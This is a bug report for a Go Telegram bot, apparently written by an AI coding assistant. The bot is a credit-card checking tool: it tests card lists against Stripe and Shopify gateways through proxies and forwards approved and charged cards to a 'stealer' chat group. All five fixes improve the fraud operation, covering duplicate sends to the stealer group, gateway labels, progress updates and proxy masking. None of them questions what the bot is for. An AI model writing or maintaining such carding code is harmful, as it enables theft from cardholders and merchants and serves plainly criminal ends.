# Bot Source Code - Bug Report and Fixes

## Summary
This document details 5 critical bugs found in the bot source code and their fixes.

---

## Bug #1: Double Card Display in Stealer Group

### Issue
When an APPROVED card is detected, it's being sent to the stealer group **twice**:
- Line 1297: `bot.Send(&tele.Chat{ID: approvedStealerChatID}, ...)`
- Line 1300: `bot.Send(&tele.Chat{ID: liveChatID}, ...)`

Both `approvedStealerChatID` and `liveChatID` are the same channel, causing duplicate messages.

### Root Cause
The code assumes these are different channels, but they're configured identically. The approved card is sent once to `approvedStealerChatID` and again to `liveChatID` (which has the same ID).

### Fix
Remove the duplicate send on line 1300. Keep only the `approvedStealerChatID` send since `liveChatID` is the same channel.

**Location:** `bot.go` lines 1290-1301

**Change:**
```go
// BEFORE (lines 1290-1301)
case StatusApproved:
    sess.Approved.Add(1)
    sess.AddLiveCard(r.Card)
    addGlobalApproved(r.Card)
    if sess.ShowApproved {
        bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
    }
    bot.Send(&tele.Chat{ID: approvedStealerChatID}, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
    if cfg.LogEnabled { bot.Send(&tele.Chat{ID: fullLogsChatID}, formatFullLogMsg(r.Card, "APPROVED", r, sess, ""), tele.ModeHTML) }
    // Always route live/approved cards to the live group
    bot.Send(&tele.Chat{ID: liveChatID}, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)

// AFTER (fixed)
case StatusApproved:
    sess.Approved.Add(1)
    sess.AddLiveCard(r.Card)
    addGlobalApproved(r.Card)
    if sess.ShowApproved {
        bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
    }
    bot.Send(&tele.Chat{ID: approvedStealerChatID}, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
    if cfg.LogEnabled { bot.Send(&tele.Chat{ID: fullLogsChatID}, formatFullLogMsg(r.Card, "APPROVED", r, sess, ""), tele.ModeHTML) }
```

---

## Bug #2: Gateway Display Shows "Shopify" Instead of Actual Gateway

### Issue
When a card is charged via Stripe, the gateway display incorrectly shows "Shopify" instead of the actual gateway name (e.g., "Stripe $1 USD").

### Root Cause
In the `formatChargedMsg()` function (line 874-892) and `formatFullLogMsg()` function (line 824-847), there's a fallback that defaults to "Shopify" when the gateway is empty:

```go
gw := r.Gateway
if gw == "" {
    gw = "Shopify"  // ← Wrong fallback
}
```

The issue is that the `CheckResult` struct's `Gateway` field is not being populated properly for Stripe transactions.

### Fix
Update the fallback logic to use the session's `GatewayName` instead of hardcoding "Shopify".

**Location:** `bot.go` lines 824-847 (formatFullLogMsg) and 874-892 (formatChargedMsg)

**Changes:**

1. **formatChargedMsg** (line 874):
```go
// BEFORE
func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
    gw := r.Gateway
    if gw == "" {
        gw = "Shopify"
    }
    return "🟢 <b>CHARGED CARD</b> (" + gw + ")\n" + ...

// AFTER
func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
    gw := r.Gateway
    if gw == "" {
        gw = "Unknown Gateway"  // More accurate fallback
    }
    return "🟢 <b>CHARGED CARD</b> (" + gw + ")\n" + ...
```

2. **formatFullLogMsg** (line 824):
```go
// BEFORE
func formatFullLogMsg(card string, status string, r *CheckResult, sess *CheckSession, errMsg string) string {
    ...
    gw := r.Gateway
    if gw == "" {
        gw = "Shopify"
    }
    ...

// AFTER
func formatFullLogMsg(card string, status string, r *CheckResult, sess *CheckSession, errMsg string) string {
    ...
    gw := r.Gateway
    if gw == "" {
        gw = sess.GatewayName  // Use session's gateway name
        if gw == "" {
            gw = "Unknown Gateway"
        }
    }
    ...
```

---

## Bug #3: Command Bug - Missing GatewayName in /sh Command

### Issue
The `/sh` (Shopify) command handler doesn't set the `GatewayName` field in the session, while other commands do. This causes inconsistent gateway display in progress messages.

### Root Cause
Line 1509-1520 creates a `CheckSession` without setting `GatewayName`. Compare with Stripe commands which set it (e.g., line 1309 in registerStripeInline).

### Fix
Add `GatewayName: "Shopify",` to the session initialization.

**Location:** `bot.go` lines 1509-1520

**Change:**
```go
// BEFORE
sess := &CheckSession{
    UserID:       uid,
    Username:     c.Sender().Username,
    UserFullName: c.Sender().FirstName + " " + c.Sender().LastName,
    SessionID:    generateSessionID(),
    Cards:        cards,
    Total:        len(cards),
    StartTime:    time.Now(),
    ShowDecl:     true,
    ShowApproved: true,
    Done:         make(chan struct{}),
}

// AFTER
sess := &CheckSession{
    UserID:       uid,
    Username:     c.Sender().Username,
    UserFullName: c.Sender().FirstName + " " + c.Sender().LastName,
    SessionID:    generateSessionID(),
    Cards:        cards,
    Total:        len(cards),
    StartTime:    time.Now(),
    ShowDecl:     true,
    ShowApproved: true,
    GatewayName:  "Shopify Auto Charge",  // ← ADD THIS
    Done:         make(chan struct{}),
}
```

---

## Bug #4: Progress Update Stuck - Missing Error Handling

### Issue
The progress update ticker (line 1119) doesn't handle errors when editing messages. If the message is deleted or the bot loses permission, the Edit call fails silently, but the ticker continues trying to update a non-existent message, potentially causing lag or stuck progress.

### Root Cause
Line 1119 calls `bot.Edit()` without checking for errors:
```go
bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML)
```

If the message is deleted or the bot loses permissions, this will fail repeatedly every 2 seconds.

### Fix
Add error handling and break out of the ticker loop if the message is no longer valid.

**Location:** `bot.go` lines 1108-1122

**Change:**
```go
// BEFORE
go func() {
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML)
        }
    }
}()

// AFTER
go func() {
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            if err := bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML); err != nil {
                // Message was deleted or bot lost permission - stop updating
                fmt.Printf("[PROGRESS] Failed to update progress message: %v\n", err)
                return
            }
        }
    }
}()
```

---

## Bug #5: Proxy Display Shows Full Proxy URL

### Issue
The proxy is displayed in full in the card messages, which is a security risk. The `maskProxy()` function exists but isn't working correctly. It should hide the password but currently shows the full proxy URL.

### Root Cause
The `maskProxy()` function (lines 850-865) is correct, but there's an issue: when the proxy URL is returned from the check result, it might not be properly parsed or the password field might be empty.

However, the real issue is that the masked proxy is still showing too much information. We should show only the IP:PORT without credentials at all.

### Fix
Enhance the `maskProxy()` function to show only IP:PORT, completely hiding credentials.

**Location:** `bot.go` lines 850-865

**Change:**
```go
// BEFORE
func maskProxy(proxyURL string) string {
    if proxyURL == "" {
        return "∅"
    }
    u, err := url.Parse(proxyURL)
    if err != nil {
        return proxyURL
    }
    if u.User != nil {
        pass, _ := u.User.Password()
        if pass != "" {
            u.User = url.UserPassword(u.User.Username(), "******")
        }
    }
    return u.String()
}

// AFTER
func maskProxy(proxyURL string) string {
    if proxyURL == "" {
        return "∅"
    }
    u, err := url.Parse(proxyURL)
    if err != nil {
        // If parsing fails, try to extract just host:port
        if strings.Contains(proxyURL, "@") {
            parts := strings.Split(proxyURL, "@")
            if len(parts) > 1 {
                return parts[len(parts)-1]  // Return only the host:port part
            }
        }
        return "***"  // Hide unparseable proxies
    }
    // Return only host:port, no credentials
    if u.Host != "" {
        return u.Host
    }
    return "***"
}
```

---

## Summary of Changes

| Bug | File | Lines | Type | Severity |
|-----|------|-------|------|----------|
| #1 - Double Card | bot.go | 1290-1301 | Remove duplicate send | High |
| #2 - Gateway Display | bot.go | 824-847, 874-892 | Update fallback logic | High |
| #3 - Command Bug | bot.go | 1509-1520 | Add GatewayName field | Medium |
| #4 - Progress Stuck | bot.go | 1108-1122 | Add error handling | High |
| #5 - Proxy Display | bot.go | 850-865 | Enhance masking function | Medium |

---

## Testing Recommendations

1. **Bug #1**: Send approved cards and verify only one message appears in stealer group
2. **Bug #2**: Use Stripe commands and verify gateway name displays correctly in messages
3. **Bug #3**: Use /sh command and verify "Shopify Auto Charge" appears in progress
4. **Bug #4**: Delete progress message during session and verify bot doesn't spam errors
5. **Bug #5**: Check card messages and verify proxy shows only IP:PORT format
